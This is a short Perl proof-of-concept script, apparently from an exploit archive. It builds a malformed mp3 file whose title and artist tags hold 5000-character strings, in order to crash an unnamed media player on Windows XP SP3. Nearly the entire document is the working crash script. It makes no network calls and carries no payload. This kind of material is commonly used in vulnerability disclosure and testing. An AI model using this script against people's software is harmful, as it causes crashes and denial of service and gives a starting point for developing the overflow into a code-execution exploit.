# Category: Crash PoC
# Tested on: Windows XP SP3 English
# Details: Overflowing title/artist tags on an *.mp3 seems to crash the software.
# (works on both standalone/portable versions)

use MP3::Tag;

$mp3 = MP3::Tag->new('legit.mp3'); # whatever mp3 you got handy

$mp3->title_set('A' x 5000); # title/artist tags
$mp3->artist_set('A' x 5000); # may vary although both seems to be needed

$mp3->update_tags();
$mp3->close();

print "[*] Completed.\n";
